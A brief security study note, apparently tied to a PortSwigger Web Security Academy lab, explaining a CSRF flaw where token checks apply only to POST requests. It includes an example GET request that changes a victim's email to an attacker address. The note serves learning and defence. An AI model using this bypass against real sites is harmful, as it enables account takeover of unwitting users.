Parent Links : [[Cross-site request forgery (CSRF)]] > [[Common CSRF vulnerabilities]]     

### Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.  
In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:  
```http 
GET /email/change?email=pwned@evil-user.net HTTP/1.1  
Host: vulnerable-website.com  
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

>LAB [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)